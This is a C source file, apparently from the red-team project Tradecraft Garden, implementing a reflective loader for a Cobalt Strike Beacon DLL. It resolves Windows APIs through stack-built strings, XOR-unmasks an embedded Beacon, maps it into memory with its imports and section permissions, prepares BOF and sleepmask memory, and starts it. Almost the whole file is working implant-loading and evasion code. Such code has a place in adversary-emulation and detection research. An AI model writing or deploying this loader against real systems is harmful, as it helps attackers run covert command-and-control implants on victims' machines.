/*
 * Copyright (C) 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * This file is part of Tradecraft Garden
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License along
 *  with this program; if not, see <https://www.gnu.org/licenses/>.
 */

/* function prototypes */
void ReflectiveLoader();

/* this is the REAL entry point to this whole mess and it needs to go first! */
__attribute__((noinline, no_reorder)) void go() {
	ReflectiveLoader();
}

/*
 * loader.h is a refactored Reflective Loader and some macros/definitions we need.
 * it has several functions intended to be used across loaders.
 */
#include "loaderdefs.h"
#include "loader.h"

/* build a table of functions we need/want */
#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
	WIN32_FUNC(LoadLibraryA);
	WIN32_FUNC(GetModuleHandleA);
	WIN32_FUNC(GetProcAddress);
	WIN32_FUNC(VirtualProtect);
	WIN32_FUNC(VirtualAlloc);
	WIN32_FUNC(VirtualFree);
} WIN32FUNCS;


__typeof__(GetModuleHandleA) * pGetModuleHandle __attribute__((section(".text")));
__typeof__(GetProcAddress)   * pGetProcAddress  __attribute__((section(".text")));

void findNeededFunctions(WIN32FUNCS * funcs) {

	/*
	 * use pGetModuleHandle & pGetProcAddress
	 * instead of walking the EAT (findFunctionByHash)
	*/

	funcs->GetModuleHandleA = (__typeof__(GetModuleHandleA) *) pGetModuleHandle;
	funcs->GetProcAddress   = (__typeof__(GetProcAddress)   *) pGetProcAddress;

	char k32[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', 0 };
	HMODULE hModule = funcs->GetModuleHandleA(k32);

	char ll[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
	funcs->LoadLibraryA = (__typeof__(LoadLibraryA) *) funcs->GetProcAddress(hModule, ll);

	char va[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
	funcs->VirtualAlloc = (__typeof__(VirtualAlloc) *) funcs->GetProcAddress(hModule, va);

	char vp[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
	funcs->VirtualProtect = (__typeof__(VirtualProtect) *) funcs->GetProcAddress(hModule, vp);

	char fr[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0 };
	funcs->VirtualFree = (__typeof__(VirtualFree) *) funcs->GetProcAddress(hModule, fr);
}

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __BEACON_DLL[0] __attribute__((section("beacon_dll")));
char __XOR_KEY[0] __attribute__((section("xor_key")));

char * getLoaderStart() {
	return (char *)&go;
}

char * findBeaconDLL() {
	return (char *)&__BEACON_DLL;
}

char * findXorKey() {
	return (char *)&__XOR_KEY;
}

/*
 * Our embedded resources are masked, so we need to unmask them.
 */
typedef struct {
	int   length;
	char  value[];
} _RESOURCE;

char * unmaskAndLoad(WIN32FUNCS * funcs) {
	char      * srcData = findBeaconDLL();
	char      * dst;
	
	_RESOURCE * key;
	_RESOURCE * src;

	/* parse our preplen + xor'd $KEY and our masked data too */
	key = (_RESOURCE *)findXorKey();
	src = (_RESOURCE *)srcData;

	/* allocate memory for our unmasked content */
	dst = funcs->VirtualAlloc(NULL, src->length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	/* unmask it */
	for (int x = 0; x < src->length; x++) {
		dst[x] = src->value[x] ^ key->value[x % key->length];
	}

	return dst;
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void ReflectiveLoader() {
	char       * loaderStart;
	char       * rawBeaconDll;
	char       * loadedBeaconDll;
	char       * bofMemory;
	char       * sleepMaskMemory;
	
	WIN32FUNCS   funcs;
	DLLDATA      beaconData;
	
	USER_DATA        bud;
	ALLOCATED_MEMORY memory;

	/* initialise bud */
	_memset(&bud, 0, sizeof(USER_DATA));
	_memset(&memory, 0, sizeof(ALLOCATED_MEMORY));
	
	bud.version = COBALT_STRIKE_VERSION;
	bud.allocatedMemory = &memory;

	/* get start of this loader */
	loaderStart = getLoaderStart();

	/* resolve Win32 functions */
	findNeededFunctions(&funcs);

	/* find Beacon DLL appended to this loader */
	rawBeaconDll = unmaskAndLoad(&funcs);

	/* parse the Beacon DLL */
	ParseDLL(rawBeaconDll, &beaconData);

	/* allocate memory for Beacon */
	loadedBeaconDll = funcs.VirtualAlloc(NULL, SizeOfDLL(&beaconData), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	/* define cleanup information for VirtualAlloc */
	ALLOCATED_MEMORY_CLEANUP_INFORMATION vaCleanup;
	_memset(&vaCleanup, 0, sizeof(ALLOCATED_MEMORY_CLEANUP_INFORMATION));

	vaCleanup.AllocationMethod = METHOD_VIRTUALALLOC;
	vaCleanup.Cleanup          = TRUE;

	/* set the region info for Beacon */
	bud.allocatedMemory->AllocatedMemoryRegions[0].Purpose            = PURPOSE_BEACON_MEMORY;
	bud.allocatedMemory->AllocatedMemoryRegions[0].AllocationBase     = loadedBeaconDll;
	bud.allocatedMemory->AllocatedMemoryRegions[0].RegionSize         = beaconData.NtHeaders->OptionalHeader.SizeOfImage;
	bud.allocatedMemory->AllocatedMemoryRegions[0].Type               = MEM_PRIVATE;
	bud.allocatedMemory->AllocatedMemoryRegions[0].CleanupInformation = vaCleanup;

	/* load Beacon into memory */
	LoadDLL(&beaconData, rawBeaconDll, loadedBeaconDll);

	/* process its imports */
	ProcessImports((IMPORTFUNCS *)&funcs, &beaconData, loadedBeaconDll);

	/* fix memory permissions and track each section */
	FixSectionsAndTrackMemory((IMPORTFUNCS *)&funcs, &beaconData, loadedBeaconDll, &bud.allocatedMemory->AllocatedMemoryRegions[0]);

	/* allocate memory for BOF & sleepmask */
	bofMemory       = funcs.VirtualAlloc(NULL, BOF_MEMORY_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	sleepMaskMemory = funcs.VirtualAlloc(NULL, SLEEPMASK_MEMORY_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	/* set memory info */
	bud.allocatedMemory->AllocatedMemoryRegions[1].Purpose                     = PURPOSE_BOF_MEMORY;
	bud.allocatedMemory->AllocatedMemoryRegions[1].AllocationBase              = bofMemory;
	bud.allocatedMemory->AllocatedMemoryRegions[1].RegionSize                  = BOF_MEMORY_SIZE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Type                        = MEM_PRIVATE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].CleanupInformation          = vaCleanup;

	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].Label           = LABEL_BUFFER; 
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].BaseAddress     = bofMemory;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].VirtualSize     = BOF_MEMORY_SIZE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].MaskSection     = TRUE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].CurrentProtect  = PAGE_READWRITE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].PreviousProtect = PAGE_READWRITE;

	bud.allocatedMemory->AllocatedMemoryRegions[2].Purpose                     = PURPOSE_SLEEPMASK_MEMORY;
	bud.allocatedMemory->AllocatedMemoryRegions[2].AllocationBase              = sleepMaskMemory;
	bud.allocatedMemory->AllocatedMemoryRegions[2].RegionSize                  = SLEEPMASK_MEMORY_SIZE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Type                        = MEM_PRIVATE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].CleanupInformation          = vaCleanup;

	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].Label           = LABEL_BUFFER; 
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].BaseAddress     = sleepMaskMemory;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].VirtualSize     = SLEEPMASK_MEMORY_SIZE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].MaskSection     = FALSE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].CurrentProtect  = PAGE_READWRITE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].PreviousProtect = PAGE_READWRITE;

	/* get the entry point */
	DLLMAIN_FUNC entryPoint = EntryPoint(&beaconData, loadedBeaconDll);

	/* free the unmasked copy */
	funcs.VirtualFree(rawBeaconDll, 0, MEM_RELEASE);

	/* call it three times */

	/* DLL_BEACON_USER_DATA */
	entryPoint((HINSTANCE)0, DLL_BEACON_USER_DATA, &bud);

	/* DLL_PROCESS_ATTACH */
	entryPoint((HINSTANCE)loadedBeaconDll, DLL_PROCESS_ATTACH, NULL);

	/* DLL_BEACON_START */
	entryPoint((HINSTANCE)loaderStart, DLL_BEACON_START, NULL);
}